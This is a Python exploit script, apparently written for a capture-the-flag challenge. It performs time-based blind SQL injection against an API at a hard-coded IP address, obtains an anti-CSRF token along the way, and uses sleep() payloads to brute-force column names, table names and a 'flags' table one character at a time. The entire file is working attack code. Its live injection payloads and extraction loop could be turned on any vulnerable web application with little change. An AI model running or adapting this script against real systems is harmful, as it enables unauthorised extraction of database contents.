#!/bin/env python
import requests
import time
from string import printable, ascii_uppercase, ascii_lowercase, Template

class Inj:

    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

def bruteforce_str_time(sql_query, time_len, inj_obj, initial_str):

    cur_str = initial_str
    ind = len(cur_str)+1

    while(True):

        changed = False

        for j in printable:

            cur_query = sql_query.format(1, ind, cur_str + j)
            pre_inj_time = time.time()
            res = inj_obj.time(cur_query)
            post_inj_time = time.time()

            if(post_inj_time - pre_inj_time > time_len):
                cur_str += j
                ind += 1
                print(cur_str)
                changed = True
                break

        if(changed == False):
            break

    return cur_str


inj = Inj('http://149.202.200.158:5100')
wait_time = 1

#query = Template("' and (select sleep($t1) from information_schema.columns where " \
#    + "table_schema=database() and binary substr(column_name, {}, {}) = '{}') = $t2 -- ")
#query = query.safe_substitute(t1=wait_time, t2=wait_time)

#Outputs flag
#table_column = bruteforce_str_time(query, wait_time, inj, "")

#query = Template("' and (select sleep($t1) from information_schema.columns where " \
#    + "table_schema=database() and binary substr(table_name, {}, {}) = '{}') = $t2 -- ")
#query = query.safe_substitute(t1=wait_time, t2=wait_time)

#Outputs dummy with "" initial string and flags with "f"
#table_name = bruteforce_str_time(query, wait_time, inj, "f")

query = Template("' and (select sleep($t1) from $d1 where " \
    + "binary substr($d2, {}, {}) = '{}') = $t2 -- ")
query = query.safe_substitute(t1=wait_time, t2=wait_time, d1="flags", d2="flag")

res = bruteforce_str_time(query, wait_time, inj, "")
print(res) #Outputs flaetext
